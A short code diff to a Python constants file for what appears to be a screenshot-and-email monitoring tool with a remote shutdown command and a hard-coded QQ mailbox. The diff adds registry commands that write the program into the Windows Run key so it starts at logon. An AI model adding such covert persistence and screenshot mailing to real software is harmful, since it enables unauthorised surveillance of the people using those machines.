@@ -10,11 +10,11 @@ class Constant(object):
     SEARCH_FILE = ".mp4"
     EMAIL_QQ = "1075220132@qq.com"
     SMTP_126_SERVER = "smtp.126.com"
-    TEST_SUBJECT = "Data"
+    TEST_SUBJECT = "Hello World"
     TEST_ATTACHS = []
     MAIN_INTERVAL = 60 * 10
-    INTERVAL = False
-    URL_PATH = "path.txt"
+    INTERVAL = True
+    URL_PATH = "Hello.txt"
     SCREEN_IMG = "ss.png"
     SCREEN_DIR = "./ss"
     MSG_SHUTDOWN = "shutdown"
@@ -23,4 +23,6 @@ class Constant(object):
     CMD_SHUTDOWN = "shutdown /p"
     DEFAULT_FROM = 1
     DEFAULT_END = 5
+    START_REGEDIT = 'reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v main /d '
+    QUERY_REGEDIT = 'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v main'
 
